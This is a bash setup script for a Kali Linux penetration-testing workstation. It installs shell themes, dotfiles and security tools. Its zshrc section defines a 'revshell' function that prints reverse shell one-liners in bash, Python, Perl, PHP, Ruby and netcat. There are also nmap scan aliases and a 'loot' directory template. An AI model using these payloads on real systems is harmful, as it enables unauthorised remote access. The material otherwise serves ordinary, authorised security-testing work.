# Create a directory for your setup script
mkdir -p ~/kali-setup

# Create the main setup script
cat << 'EOF' > ~/kali-setup/setup.sh
#!/bin/bash

# ANSI color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print section headers
print_section() {
    echo -e "\n${BLUE}[*] $1...${NC}"
}

# Function to print success messages
print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

# Function to print info messages
print_info() {
    echo -e "${CYAN}[i] $1${NC}"
}

# Function to print warning messages
print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

# Function to print error messages
print_error() {
    echo -e "${RED}[-] $1${NC}"
}

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    print_error "Please do not run this script as root"
    exit 1
fi

# Start the setup
clear
echo -e "${BLUE}"
echo "╔═══════════════════════════════════════════════════════════════════════════╗"
echo "║                                                                           ║"
echo "║   ██╗  ██╗ █████╗ ██╗     ██╗    ███████╗███████╗████████╗██╗   ██╗██████╗  ║"
echo "║   ██║ ██╔╝██╔══██╗██║     ██║    ██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗ ║"
echo "║   █████╔╝ ███████║██║     ██║    ███████╗█████╗     ██║   ██║   ██║██████╔╝ ║"
echo "║   ██╔═██╗ ██╔══██║██║     ██║    ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝  ║"
echo "║   ██║  ██╗██║  ██║███████╗██║    ███████║███████╗   ██║   ╚██████╔╝██║      ║"
echo "║   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝      ║"
echo "║                                                                           ║"
echo "╚═══════════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}This script will set up your Kali Linux environment with custom configurations and tools.${NC}"
echo -e "${YELLOW}It will install Zsh, Oh My Zsh, Powerlevel10k, and various other tools and configurations.${NC}"
echo ""
read -p "Press Enter to continue or Ctrl+C to abort..."

# Update system
print_section "Updating system packages"
sudo apt update
sudo apt upgrade -y
print_success "System updated"

# Install basic tools
print_section "Installing basic tools"
sudo apt install -y zsh git curl wget htop bat fzf ripgrep eza vim-nox tmux python3-pip
print_success "Basic tools installed"

# Install security tools
print_section "Installing security tools"
sudo apt install -y nmap dirb hydra john hashcat wireshark burpsuite metasploit-framework gobuster nikto wpscan sqlmap exploitdb
print_success "Security tools installed"

# Install Oh My Zsh
print_section "Installing Oh My Zsh"
if [ -d "$HOME/.oh-my-zsh" ]; then
    print_info "Oh My Zsh is already installed"
else
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
    print_success "Oh My Zsh installed"
fi

# Install Powerlevel10k theme
print_section "Installing Powerlevel10k theme"
if [ -d "${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k" ]; then
    print_info "Powerlevel10k theme is already installed"
else
    git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
    print_success "Powerlevel10k theme installed"
fi

# Install Zsh plugins
print_section "Installing Zsh plugins"
if [ ! -d "${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions" ]; then
    git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
    print_success "Zsh autosuggestions plugin installed"
else
    print_info "Zsh autosuggestions plugin is already installed"
fi

if [ ! -d "${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting" ]; then
    git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
    print_success "Zsh syntax highlighting plugin installed"
else
    print_info "Zsh syntax highlighting plugin is already installed"
fi

# Install Python packages
print_section "Installing Python packages"
pip3 install --user pwntools requests beautifulsoup4 colorama
print_success "Python packages installed"

# Install Nerd Fonts
print_section "Installing Nerd Fonts"
mkdir -p ~/.local/share/fonts
cd ~/.local/share/fonts
wget -q https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Regular.ttf
wget -q https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold.ttf
wget -q https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Italic.ttf
wget -q https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold%20Italic.ttf
fc-cache -f -v
print_success "Nerd Fonts installed"

# Configure Zsh
print_section "Configuring Zsh"
# Backup existing .zshrc if it exists
if [ -f "$HOME/.zshrc" ]; then
    cp "$HOME/.zshrc" "$HOME/.zshrc.backup.$(date +%Y%m%d%H%M%S)"
    print_info "Backed up existing .zshrc"
fi

# Create new .zshrc
cat << 'ZSHRC' > "$HOME/.zshrc"
# Enable Powerlevel10k instant prompt
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# Path to your oh-my-zsh installation
export ZSH="$HOME/.oh-my-zsh"

# Set theme
ZSH_THEME="powerlevel10k/powerlevel10k"

# Set plugins
plugins=(
    git
    zsh-autosuggestions
    zsh-syntax-highlighting
    sudo
    web-search
    copypath
    dirhistory
    history
    extract
)

# Source oh-my-zsh
source $ZSH/oh-my-zsh.sh

# User configuration
export LANG=en_US.UTF-8
export EDITOR='vim'

# Aliases
alias update='sudo apt update && sudo apt upgrade -y'
alias install='sudo apt install -y'
alias remove='sudo apt remove -y'
alias purge='sudo apt purge -y'
alias cls='clear'
alias ll='ls -la'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias ip='ip -c'
alias grep='grep --color=auto'
alias mkdir='mkdir -pv'
alias ports='netstat -tulanp'
alias h='history'
alias j='jobs -l'
alias path='echo -e ${PATH//:/\\n}'
alias now='date +"%T"'
alias nowtime=now
alias nowdate='date +"%d-%m-%Y"'

# Security focused aliases
alias msf="msfconsole"
alias msfdb="msfdb"
alias msfvenom="msfvenom"
alias burp="burpsuite"
alias sqlmap="sqlmap"
alias dirb="dirb"
alias nikto="nikto"
alias hydra="hydra"
alias john="john"
alias hashcat="hashcat"
alias nmap_open_ports='nmap --open'
alias nmap_list_interfaces='nmap --iflist'
alias nmap_slow='sudo nmap -sS -v -T1'
alias nmap_fin='sudo nmap -sF -v'
alias nmap_full='sudo nmap -sS -T4 -PE -PP -PS80,443 -PY -g 53 -A -p1-65535'
alias nmap_check_for_firewall='sudo nmap -sA -p1-65535 -v -T4'
alias nmap_quick='nmap -T4 -F'
alias nmap_detect_versions='sudo nmap -sV -p1-65535 -O --osscan-guess -T4 -Pn'

# Network aliases
alias myip="curl -s https://ipinfo.io/ip"
alias localip="hostname -I | awk '{print \$1}'"
alias ports="netstat -tulanp"
alias listening="sudo lsof -i -P | grep LISTEN"
alias tcpdump="sudo tcpdump"

# Use bat instead of cat if available
if command -v batcat &> /dev/null; then
    alias cat="batcat --style=plain --paging=never"
fi

# Use eza instead of ls if available
if command -v eza &> /dev/null; then
    alias ls="eza --icons --group-directories-first"
    alias ll="eza -la --icons --group-directories-first"
    alias tree="eza --tree --icons"
fi

# Function to create and cd into a directory
function mkcd() {
  mkdir -p "$1" && cd "$1"
}

# Function to extract various archive formats
function extract() {
  if [ -f $1 ] ; then
    case $1 in
      *.tar.bz2)   tar xjf $1     ;;
      *.tar.gz)    tar xzf $1     ;;
      *.bz2)       bunzip2 $1     ;;
      *.rar)       unrar e $1     ;;
      *.gz)        gunzip $1      ;;
      *.tar)       tar xf $1      ;;
      *.tbz2)      tar xjf $1     ;;
      *.tgz)       tar xzf $1     ;;
      *.zip)       unzip $1       ;;
      *.Z)         uncompress $1  ;;
      *.7z)        7z x $1        ;;
      *)           echo "'$1' cannot be extracted via extract()" ;;
    esac
  else
    echo "'$1' is not a valid file"
  fi
}

# Function to scan a network for live hosts
function scan_network() {
  if [ -z "$1" ]; then
    echo "Usage: scan_network <network/CIDR>"
    echo "Example: scan_network 192.168.1.0/24"
    return 1
  fi
  
  echo "[*] Scanning network $1 for live hosts..."
  sudo nmap -sn "$1" -oG - | grep "Up" | awk '{print $2}'
}

# Function to perform a quick vulnerability scan
function quickscan() {
  if [ -z "$1" ]; then
    echo "Usage: quickscan <target>"
    echo "Example: quickscan 192.168.1.10"
    return 1
  fi
  
  echo "[*] Performing quick vulnerability scan on $1..."
  sudo nmap -sV -sC -O --script vuln "$1" -oN "quickscan_$1.txt"
  echo "[+] Scan complete! Results saved to quickscan_$1.txt"
}

# Function to start a simple HTTP server
function webserver() {
  local port=${1:-8000}
  echo "[*] Starting HTTP server on port $port..."
  python3 -m http.server "$port"
}

# Function to generate a reverse shell payload
function revshell() {
  if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: revshell <lhost> <lport> <type>"
    echo "Types: bash, python, perl, php, ruby, netcat"
    return 1
  fi
  
  local lhost="$1"
  local lport="$2"
  local type="$3"
  
  case "$type" in
    bash)
      echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
      ;;
    python)
      echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
      ;;
    perl)
      echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
      ;;
    php)
      echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      ;;
    ruby)
      echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$lhost\",\"$lport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
      ;;
    netcat)
      echo "nc -e /bin/sh $lhost $lport"
      echo "If the above doesn't work, try: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
      ;;
    *)
      echo "Unknown type: $type"
      echo "Types: bash, python, perl, php, ruby, netcat"
      return 1
      ;;
  esac
}

# Function to create a new pentest directory structure
function newpentest() {
  if [ -z "$1" ]; then
    echo "Usage: newpentest <project_name>"
    return 1
  fi
  
  mkdir -p "$1"/{recon,exploit,loot,report,tools,notes}
  
  # Create README files in each directory
  echo "# Reconnaissance" > "$1"/recon/README.md
  echo "Store all reconnaissance data here." >> "$1"/recon/README.md
  
  echo "# Exploitation" > "$1"/exploit/README.md
  echo "Store all exploitation scripts and notes here." >> "$1"/exploit/README.md
  
  echo "# Loot" > "$1"/loot/README.md
  echo "Store all obtained credentials, hashes, and other sensitive data here." >> "$1"/loot/README.md
  
  echo "# Report" > "$1"/report/README.md
  echo "Store all report drafts and final reports here." >> "$1"/report/README.md
  
  echo "# Tools" > "$1"/tools/README.md
  echo "Store all custom tools and scripts here." >> "$1"/tools/README.md
  
  echo "# Notes" > "$1"/notes/README.md
  echo "Store all general notes and observations here." >> "$1"/notes/README.md
  
  # Create a main README
  cat << END > "$1"/README.md
# Penetration Test: $1

## Project Overview
- **Client:** [Client Name]
- **Start Date:** $(date +"%Y-%m-%d")
- **End Date:** [End Date]
- **Scope:** [Brief description of the scope]

## Directory Structure
- **recon/**: Reconnaissance data
- **exploit/**: Exploitation scripts and notes
- **loot/**: Obtained credentials and sensitive data
- **report/**: Report drafts and final reports
- **tools/**: Custom tools and scripts
- **notes/**: General notes and observations

## Checklist
- [ ] Reconnaissance completed
- [ ] Vulnerabilities identified
- [ ] Exploitation attempted
- [ ] Post-exploitation completed
- [ ] Evidence collected
- [ ] Report drafted
- [ ] Report finalized
END

  echo "Created new pentest directory structure in $1"
  cd "$1"
}

# Source Powerlevel10k configuration
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# Welcome message
~/.welcome.sh 2>/dev/null || true
ZSHRC

print_success "Zsh configured"

# Configure Powerlevel10k
print_section "Configuring Powerlevel10k"
cat << 'P10K' > "$HOME/.p10k.zsh"
# Generated by Powerlevel10k configuration wizard
# Basic configuration with prompt segments for:
# - current directory
# - git status
# - command execution time
# - error status
# - root indicator
# - background jobs
# - prompt character

'builtin' 'local' '-a' 'p10k_config_opts'
[[ ! -o 'aliases'         ]] || p10k_config_opts+=('aliases')
[[ ! -o 'sh_glob'         ]] || p10k_config_opts+=('sh_glob')
[[ ! -o 'no_brace_expand' ]] || p10k_config_opts+=('no_brace_expand')
'builtin' 'setopt' 'no_aliases' 'no_sh_glob' 'brace_expand'

() {
  emulate -L zsh -o extended_glob

  # Unset all configuration options.
  unset -m '(POWERLEVEL9K_*|DEFAULT_USER)~POWERLEVEL9K_GITSTATUS_DIR'

  # Left prompt segments.
  typeset -g POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(
    dir                     # current directory
    vcs                     # git status
    prompt_char             # prompt symbol
  )

  # Right prompt segments.
  typeset -g POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(
    status                  # exit code of the last command
    command_execution_time  # duration of the last command
    background_jobs         # presence of background jobs
    root_indicator          # root indicator
  )

  # Basic style options
  typeset -g POWERLEVEL9K_BACKGROUND=                            # transparent background
  typeset -g POWERLEVEL9K_MULTILINE_FIRST_PROMPT_PREFIX='%242F╭─'
  typeset -g POWERLEVEL9K_MULTILINE_NEWLINE_PROMPT_PREFIX='%242F├─'
  typeset -g POWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX='%242F╰─'
  typeset -g POWERLEVEL9K_MULTILINE_FIRST_PROMPT_SUFFIX='%242F─╮'
  typeset -g POWERLEVEL9K_MULTILINE_NEWLINE_PROMPT_SUFFIX='%242F─┤'
  typeset -g POWERLEVEL9K_MULTILINE_LAST_PROMPT_SUFFIX='%242F─╯'

  # Directory
  typeset -g POWERLEVEL9K_DIR_BACKGROUND=4
  typeset -g POWERLEVEL9K_DIR_FOREGROUND=0
  typeset -g POWERLEVEL9K_SHORTEN_STRATEGY=truncate_to_unique
  typeset -g POWERLEVEL9K_SHORTEN_DIR_LENGTH=3

  # VCS
  typeset -g POWERLEVEL9K_VCS_CLEAN_BACKGROUND=2
  typeset -g POWERLEVEL9K_VCS_MODIFIED_BACKGROUND=3
  typeset -g POWERLEVEL9K_VCS_UNTRACKED_BACKGROUND=2
  typeset -g POWERLEVEL9K_VCS_CONFLICTED_BACKGROUND=3
  typeset -g POWERLEVEL9K_VCS_LOADING_BACKGROUND=8

  # Prompt character
  typeset -g POWERLEVEL9K_PROMPT_CHAR_OK_{VIINS,VICMD,VIVIS,VIOWR}_FOREGROUND=2
  typeset -g POWERLEVEL9K_PROMPT_CHAR_ERROR_{VIINS,VICMD,VIVIS,VIOWR}_FOREGROUND=1
  typeset -g POWERLEVEL9K_PROMPT_CHAR_{OK,ERROR}_VIINS_CONTENT_EXPANSION='❯'
  typeset -g POWERLEVEL9K_PROMPT_CHAR_{OK,ERROR}_VICMD_CONTENT_EXPANSION='❮'
  typeset -g POWERLEVEL9K_PROMPT_CHAR_{OK,ERROR}_VIVIS_CONTENT_EXPANSION='V'
  typeset -g POWERLEVEL9K_PROMPT_CHAR_{OK,ERROR}_VIOWR_CONTENT_EXPANSION='▶'
  typeset -g POWERLEVEL9K_PROMPT_CHAR_OVERWRITE_STATE=true

  # Status
  typeset -g POWERLEVEL9K_STATUS_EXTENDED_STATES=true
  typeset -g POWERLEVEL9K_STATUS_OK=false
  typeset -g POWERLEVEL9K_STATUS_ERROR_BACKGROUND=1
  typeset -g POWERLEVEL9K_STATUS_ERROR_FOREGROUND=0

  # Command execution time
  typeset -g POWERLEVEL9K_COMMAND_EXECUTION_TIME_THRESHOLD=3
  typeset -g POWERLEVEL9K_COMMAND_EXECUTION_TIME_BACKGROUND=5
  typeset -g POWERLEVEL9K_COMMAND_EXECUTION_TIME_FOREGROUND=0
  typeset -g POWERLEVEL9K_COMMAND_EXECUTION_TIME_FORMAT='d h m s'

  # Background jobs
  typeset -g POWERLEVEL9K_BACKGROUND_JOBS_VERBOSE=false
  typeset -g POWERLEVEL9K_BACKGROUND_JOBS_BACKGROUND=5
  typeset -g POWERLEVEL9K_BACKGROUND_JOBS_FOREGROUND=0

  # Root indicator
  typeset -g POWERLEVEL9K_ROOT_INDICATOR_BACKGROUND=1
  typeset -g POWERLEVEL9K_ROOT_INDICATOR_FOREGROUND=0
  typeset -g POWERLEVEL9K_ROOT_INDICATOR_CONTENT_EXPANSION='%B⚡'

  # Transient prompt
  typeset -g POWERLEVEL9K_TRANSIENT_PROMPT=off

  # Instant prompt mode
  typeset -g POWERLEVEL9K_INSTANT_PROMPT=verbose

  # Hot reload
  typeset -g POWERLEVEL9K_DISABLE_HOT_RELOAD=false

  # Icons
  typeset -g POWERLEVEL9K_VCS_BRANCH_ICON='\uF126 '
  typeset -g POWERLEVEL9K_VCS_UNTRACKED_ICON='?'
}

(( ${#p10k_config_opts} )) && setopt ${p10k_config_opts[@]}
'builtin' 'unset' 'p10k_config_opts'
P10K

print_success "Powerlevel10k configured"

# Configure Vim
print_section "Configuring Vim"
cat << 'VIMRC' > "$HOME/.vimrc"
" Enable syntax highlighting
syntax on

" Show line numbers
set number

" Enable mouse support
set mouse=a

" Set tab width to 4 spaces
set tabstop=4
set shiftwidth=4
set expandtab

" Enable auto-indentation
set autoindent
set smartindent

" Highlight search results
set hlsearch
set incsearch

" Enable ruler
set ruler

" Enable status line
set laststatus=2

" Set color scheme
colorscheme desert

" Enable file type detection
filetype plugin indent on

" Highlight current line
set cursorline

" Show matching brackets
set showmatch

" Enable wildmenu
set wildmenu
set wildmode=list:longest,full

" Disable backup files
set nobackup
set nowritebackup
set noswapfile

" Enable persistent undo
set undofile
set undodir=~/.vim/undodir
VIMRC

# Create undo directory for vim
mkdir -p ~/.vim/undodir
print_success "Vim configured"

# Configure Tmux
print_section "Configuring Tmux"
cat << 'TMUX' > "$HOME/.tmux.conf"
# Set prefix to Ctrl-a
unbind C-b
set -g prefix C-a
bind C-a send-prefix

# Enable mouse mode
set -g mouse on

# Start window numbering at 1
set -g base-index 1
setw -g pane-base-index 1

# Automatically renumber windows
set -g renumber-windows on

# Increase history limit
set -g history-limit 10000

# Set terminal to 256 colors
set -g default-terminal "screen-256color"

# Split panes using | and -
bind | split-window -h
bind - split-window -v
unbind '"'
unbind %

# Reload config file
bind r source-file ~/.tmux.conf \; display "Config reloaded!"

# Switch panes using Alt-arrow without prefix
bind -n M-Left select-pane -L
bind -n M-Right select-pane -R
bind -n M-Up select-pane -U
bind -n M-Down select-pane -D

# Set status bar
set -g status-bg black
set -g status-fg white
set -g status-left "#[fg=green]Session: #S #[fg=yellow]Window: #I #[fg=cyan]Pane: #P"
set -g status-right "#[fg=cyan]%d %b %R"
set -g status-interval 60
set -g status-justify centre
TMUX

print_success "Tmux configured"

# Configure Terminator
print_section "Configuring Terminator"
mkdir -p ~/.config/terminator
cat << 'TERMINATOR' > ~/.config/terminator/config
[global_config]
  title_transmit_bg_color = "#2777ff"
  title_inactive_bg_color = "#404040"
  focus = system
  suppress_multiple_term_dialog = True
[keybindings]
[profiles]
  [[default]]
    background_darkness = 0.9
    background_type = transparent
    cursor_color = "#aaaaaa"
    font = MesloLGS NF 10
    foreground_color = "#ffffff"
    show_titlebar = False
    scrollbar_position = hidden
    scrollback_lines = 5000
    palette = "#000000:#cc0000:#4e9a06:#c4a000:#3465a4:#75507b:#06989a:#d3d7cf:#555753:#ef2929:#8ae234:#fce94f:#729fcf:#ad7fa8:#34e2e2:#eeeeec"
    use_system_font = False
[layouts]
  [[default]]
    [[[window0]]]
      type = Window
      parent = ""
    [[[child1]]]
      type = Terminal
      parent = window0
[plugins]
TERMINATOR

print_success "Terminator configured"

# Create welcome script
print_section "Creating welcome script"
cat << 'WELCOME' > "$HOME/.welcome.sh"
#!/bin/bash
clear
echo -e "\e[1;34m"
echo "╔═══════════════════════════════════════════════════════════════════════════╗"
echo "║                                                                           ║"
echo "║   ██╗  ██╗ █████╗ ██╗     ██╗    ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗  ║"
echo "║   ██║ ██╔╝██╔══██╗██║     ██║    ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝  ║"
echo "║   █████╔╝ ███████║██║     ██║    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝   ║"
echo "║   ██╔═██╗ ██╔══██║██║     ██║    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗   ║"
echo "║   ██║  ██╗██║  ██║███████╗██║    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗  ║"
echo "║   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝  ║"
echo "║                                                                           ║"
echo "╚═══════════════════════════════════════════════════════════════════════════╝"
echo -e "\e[0m"

# Get a random security tip
TIPS=(
    "Always keep your Kali system updated with 'sudo apt update && sudo apt upgrade'"
    "Use strong, unique passwords for each of your accounts"
    "Consider using a VPN when performing security assessments"
    "Document everything during your penetration tests"
    "Always have proper authorization before testing any system"
    "Keep your tools organized in separate directories by category"
    "Learn to use Metasploit Framework effectively for exploitation"
    "Master Burp Suite for web application testing"
    "Practice regularly on platforms like HackTheBox and TryHackMe"
    "Remember that the best hackers are also excellent at documentation"
    "Use tmux for managing multiple terminal sessions during assessments"
    "Learn bash scripting to automate repetitive tasks"
    "Keep a local wiki or notes system for techniques you learn"
)

# Print system info
echo -e "\e[1;32m[*] System Information:\e[0m"
echo -e "\e[1;36m    Date: \e[0m$(date)"
echo -e "\e[1;36m    Kernel: \e[0m$(uname -r)"
echo -e "\e[1;36m    Uptime: \e[0m$(uptime -p)"
echo -e "\e[1;36m    IP Address: \e[0m$(hostname -I | awk '{print $1}')"

# Print a random tip
RANDOM_TIP=${TIPS[$RANDOM % ${#TIPS[@]}]}
echo -e "\n\e[1;33m[*] Security Tip of the Day:\e[0m"
echo -e "\e[1;37m    $RANDOM_TIP\e[0m\n"

# Show pending updates if any
UPDATES=$(apt list --upgradable 2>/dev/null | grep -c upgradable)
if [ $UPDATES -gt 0 ]; then
    echo -e "\e[1;31m[!] You have $UPDATES package updates available. Run 'update' to install them.\e[0m\n"
fi
WELCOME

chmod +x "$HOME/.welcome.sh"
print_success "Welcome script created"

# Create tool update script
print_section "Creating tool update script"
cat << 'UPDATE' > "$HOME/update_tools.sh"
#!/bin/bash

# ANSI color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}[*] Starting Kali Linux tool update script...${NC}"

# Update system packages
echo -e "\n${YELLOW}[*] Updating system packages...${NC}"
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y
sudo apt autoremove -y
sudo apt autoclean

# Update Metasploit
echo -e "\n${YELLOW}[*] Updating Metasploit Framework...${NC}"
sudo apt install -y metasploit-framework

# Update searchsploit database
echo -e "\n${YELLOW}[*] Updating SearchSploit database...${NC}"
sudo searchsploit -u

# Update nmap scripts
echo -e "\n${YELLOW}[*] Updating Nmap scripts...${NC}"
sudo nmap --script-updatedb

# Update tldr pages
if command -v tldr &> /dev/null; then
    echo -e "\n${YELLOW}[*] Updating tldr pages...${NC}"
    tldr --update
fi

# Update Python packages
echo -e "\n${YELLOW}[*] Updating Python packages...${NC}"
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U

# Update Oh My Zsh
echo -e "\n${YELLOW}[*] Updating Oh My Zsh...${NC}"
cd ~/.oh-my-zsh
git pull

# Update Powerlevel10k
echo -e "\n${YELLOW}[*] Updating Powerlevel10k...${NC}"
cd ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
git pull

# Update zsh plugins
echo -e "\n${YELLOW}[*] Updating Zsh plugins...${NC}"
cd ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
git pull
cd ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
git pull

echo -e "\n${GREEN}[+] All tools have been updated successfully!${NC}"
UPDATE

chmod +x "$HOME/update_tools.sh"
echo 'alias update-tools="~/update_tools.sh"' >> ~/.zshrc
print_success "Tool update script created"

# Create dircolors
print_section "Creating dircolors"
cat << 'DIRCOLORS' > "$HOME/.dircolors"
# Configuration file for dircolors, a utility to help you set the
# LS_COLORS environment variable used by GNU ls with the --color option.

# The keywords COLOR, OPTIONS, and EIGHTBIT (honored by the
# slackware version of dircolors) are recognized but ignored.

# Below are TERM entries, which can be a glob patterns, to match
# against the TERM environment variable to determine if it is colorizable.
TERM Eterm
TERM ansi
TERM *color*
TERM con[0-9]*x[0-9]*
TERM cons25
TERM console
TERM cygwin
TERM dtterm
TERM gnome
TERM hurd
TERM jfbterm
TERM konsole
TERM kterm
TERM linux
TERM linux-c
TERM mlterm
TERM putty
TERM rxvt*
TERM screen*
TERM st
TERM terminator
TERM tmux*
TERM vt100
TERM xterm*

# Below are the color init strings for the basic file types.
# One can use codes for 256 or more colors supported by modern terminals.
# The default color codes use the capabilities of an 8 color terminal
# with some additional attributes as per the following codes:
# Attribute codes:
# 00=none 01=bold 04=underscore 05=blink 07=reverse 08=concealed
# Text color codes:
# 30=black 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 37=white
# Background color codes:
# 40=black 41=red 42=green 43=yellow 44=blue 45=magenta 46=cyan 47=white
NORMAL 00 # no color code at all
FILE 00 # regular file: use no color at all
RESET 0 # reset to "normal" color
DIR 01;34 # directory
LINK 01;36 # symbolic link
MULTIHARDLINK 00 # regular file with more than one link
FIFO 40;33 # pipe
SOCK 01;35 # socket
DOOR 01;35 # door
BLK 40;33;01 # block device driver
CHR 40;33;01 # character device driver
ORPHAN 40;31;01 # symlink to nonexistent file, or non-stat'able file
MISSING 00 # ... and the files they point to
SETUID 37;41 # file that is setuid (u+s)
SETGID 30;43 # file that is setgid (g+s)
CAPABILITY 30;41 # file with capability
STICKY_OTHER_WRITABLE 30;42 # dir that is sticky and other-writable (+t,o+w)
OTHER_WRITABLE 34;42 # dir that is other-writable (o+w) and not sticky
STICKY 37;44 # dir with the sticky bit set (+t) and not other-writable

# Additional file type extensions
# Executables
.cmd 01;32
.exe 01;32
.com 01;32
.btm 01;32
.bat 01;32
.sh 01;32
.csh 01;32
.py 01;32
.pl 01;32
.rb 01;32

# Archives
.tar 01;31
.tgz 01;31
.arc 01;31
.arj 01;31
.taz 01;31
.lha 01;31
.lz4 01;31
.lzh 01;31
.lzma 01;31
.tlz 01;31
.txz 01;31
.tzo 01;31
.t7z 01;31
.zip 01;31
.z 01;31
.dz 01;31
.gz 01;31
.lrz 01;31
.lz 01;31
.lzo 01;31
.xz 01;31
.zst 01;31
.tzst 01;31
.bz2 01;31
.bz 01;31
.tbz 01;31
.tbz2 01;31
.tz 01;31
.deb 01;31
.rpm 01;31
.jar 01;31
.war 01;31
.ear 01;31
.sar 01;31
.rar 01;31
.alz 01;31
.ace 01;31
.zoo 01;31
.cpio 01;31
.7z 01;31
.rz 01;31
.cab 01;31
.wim 01;31
.swm 01;31
.dwm 01;31
.esd 01;31

# Image formats
.jpg 01;35
.jpeg 01;35
.mjpg 01;35
.mjpeg 01;35
.gif 01;35
.bmp 01;35
.pbm 01;35
.pgm 01;35
.ppm 01;35
.tga 01;35
.xbm 01;35
.xpm 01;35
.tif 01;35
.tiff 01;35
.png 01;35
.svg 01;35
.svgz 01;35
.mng 01;35
.pcx 01;35
.mov 01;35
.mpg 01;35
.mpeg 01;35
.m2v 01;35
.mkv 01;35
.webm 01;35
.webp 01;35
.ogm 01;35
.mp4 01;35
.m4v 01;35
.mp4v 01;35
.vob 01;35
.qt 01;35
.nuv 01;35
.wmv 01;35
.asf 01;35
.rm 01;35
.rmvb 01;35
.flc 01;35
.avi 01;35
.fli 01;35
.flv 01;35
.gl 01;35
.dl 01;35
.xcf 01;35
.xwd 01;35
.yuv 01;35
.cgm 01;35
.emf 01;35
.ogv 01;35
.ogx 01;35

# Audio formats
.aac 00;36
.au 00;36
.flac 00;36
.m4a 00;36
.mid 00;36
.midi 00;36
.mka 00;36
.mp3 00;36
.mpc 00;36
.ogg 00;36
.ra 00;36
.wav 00;36
.oga 00;36
.opus 00;36
.spx 00;36
.xspf 00;36
DIRCOLORS

echo 'eval "$(dircolors ~/.dircolors)"' >> ~/.zshrc
print_success "Dircolors created"

# Create a README for the setup
print_section "Creating README"
cat << 'README' > "$HOME/kali-setup/README.md"
# Kali Linux Setup Script

This repository contains a script to set up a customized Kali Linux environment with various tools and configurations.

## Features

- Installs and configures Zsh with Oh My Zsh
- Installs and configures Powerlevel10k theme
- Installs useful Zsh plugins (autosuggestions, syntax highlighting)
- Installs and configures various security tools
- Sets up custom aliases and functions for penetration testing
- Configures Vim, Tmux, and Terminator
- Adds a welcome message with security tips
- Includes a tool update script

## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/yourusername/kali-setup.git
